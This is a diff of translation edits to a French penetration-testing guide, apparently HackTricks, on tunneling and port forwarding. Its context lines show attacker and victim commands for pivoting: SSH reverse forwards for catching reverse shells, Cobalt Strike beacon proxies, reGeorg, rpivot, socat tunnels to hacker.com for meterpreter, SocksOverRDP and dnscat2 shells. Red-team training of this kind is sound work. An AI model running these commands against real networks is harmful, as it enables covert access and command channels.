@@ -1,4 +1,4 @@
-# Tunneling et Redirection de Port
+# Tunneling et Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
@@ -57,7 +57,7 @@ ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port
 ```
 ### Reverse Port Forwarding
 
-Ceci est utile pour obtenir des shells inversés à partir d'hôtes internes à travers une DMZ vers votre hôte :
+Ceci est utile pour obtenir des shells inversés à partir d'hôtes internes via une DMZ vers votre hôte :
 ```bash
 ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 # Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
@@ -132,7 +132,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 ```
 ## Cobalt Strike
 
-### Proxy SOCKS
+### SOCKS proxy
 
 Ouvrez un port dans le teamserver écoutant sur toutes les interfaces qui peuvent être utilisées pour **router le trafic à travers le beacon**.
 ```bash
@@ -145,7 +145,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 > [!WARNING]
-> Dans ce cas, le **port est ouvert dans l'hôte beacon**, pas dans le Team Server et le trafic est envoyé au Team Server et de là à l'hôte:port indiqué.
+> Dans ce cas, le **port est ouvert sur l'hôte beacon**, pas sur le Team Server et le trafic est envoyé au Team Server et de là à l'hôte:port indiqué.
 ```bash
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
@@ -160,7 +160,7 @@ rportfwd stop [bind port]
 
 > [!WARNING]
 > Dans ce cas, le **port est ouvert dans l'hôte beacon**, pas dans le Team Server et le **trafic est envoyé au client Cobalt Strike** (pas au Team Server) et de là au hôte:port indiqué.
-```
+```bash
 rportfwd_local [bind port] [forward host] [forward port]
 rportfwd_local stop [bind port]
 ```
@@ -168,7 +168,7 @@ rportfwd_local stop [bind port]
 
 [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)
 
-Vous devez télécharger un fichier web tunnel : ashx|aspx|js|jsp|php|php|jsp
+Vous devez télécharger un tunnel de fichier web : ashx|aspx|js|jsp|php|php|jsp
 ```bash
 python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 ```
@@ -219,7 +219,7 @@ interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_age
 # Display the tun interfaces -- Attacker
 interface_list
 ```
-### Liaison et Écoute
+### Liaison et Écoute de l'Agent
 ```bash
 # Establish a tunnel from the proxy server to the agent
 # Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
@@ -246,7 +246,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivoter à travers **NTLM proxy**
+Pivot through **proxy NTLM**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -286,7 +286,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Vous pouvez contourner un **proxy non authentifié** en exécutant cette ligne à la place de la dernière dans la console de la victime :
+Vous pouvez contourner un **proxy non authentifié** en exécutant cette ligne au lieu de la dernière dans la console de la victime :
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -312,7 +312,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Connectez le port SSH local (22) au port 443 de l'hôte attaquant.
+Connectez le port SSH local (22) au port 443 de l'hôte attaquant
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -354,7 +354,7 @@ Dans votre ordinateur client, chargez **`SocksOverRDP-Plugin.dll`** comme ceci :
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Maintenant, nous pouvons **connecter** à la **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** disant que le **plugin SocksOverRDP est activé**, et il va **écouter** sur **127.0.0.1:1080**.
+Maintenant, nous pouvons **connecter** au **victime** via **RDP** en utilisant **`mstsc.exe`**, et nous devrions recevoir un **message** disant que le **plugin SocksOverRDP est activé**, et il va **écouter** sur **127.0.0.1:1080**.
 
 **Connectez-vous** via **RDP** et téléchargez & exécutez sur la machine de la victime le binaire `SocksOverRDP-Server.exe` :
 ```
@@ -364,13 +364,13 @@ Maintenant, confirmez sur votre machine (attaquant) que le port 1080 est à l'é
 ```
 netstat -antb | findstr 1080
 ```
-Maintenant, vous pouvez utiliser [**Proxifier**](https://www.proxifier.com/) **pour proxy le trafic à travers ce port.**
+Maintenant, vous pouvez utiliser [**Proxifier**](https://www.proxifier.com/) **pour proxyfier le trafic à travers ce port.**
 
-## Proxifier les applications GUI Windows
+## Proxyfier les applications GUI Windows
 
-Vous pouvez faire naviguer les applications GUI Windows à travers un proxy en utilisant [**Proxifier**](https://www.proxifier.com/).\
+Vous pouvez faire en sorte que les applications GUI Windows naviguent à travers un proxy en utilisant [**Proxifier**](https://www.proxifier.com/).\
 Dans **Profile -> Proxy Servers**, ajoutez l'IP et le port du serveur SOCKS.\
-Dans **Profile -> Proxification Rules**, ajoutez le nom du programme à proxifier et les connexions aux IP que vous souhaitez proxifier.
+Dans **Profile -> Proxification Rules**, ajoutez le nom du programme à proxyfier et les connexions aux IP que vous souhaitez proxyfier.
 
 ## Contournement du proxy NTLM
 
@@ -430,7 +430,7 @@ victim> ./dnscat2 --dns host=10.10.10.10,port=5353
 ```
 #### **Dans PowerShell**
 
-Vous pouvez utiliser [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) pour exécuter un client dnscat2 dans PowerShell :
+Vous pouvez utiliser [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) pour exécuter un client dnscat2 dans powershell :
 ```
 Import-Module .\dnscat2.ps1
 Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
@@ -480,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **est un outil pour exposer des solutions à Internet en une ligne de commande.**\
-_Les URI d'exposition sont comme :_ **UID.ngrok.io**
+_Exposition URI sont comme:_ **UID.ngrok.io**
 
 ### Installation
 
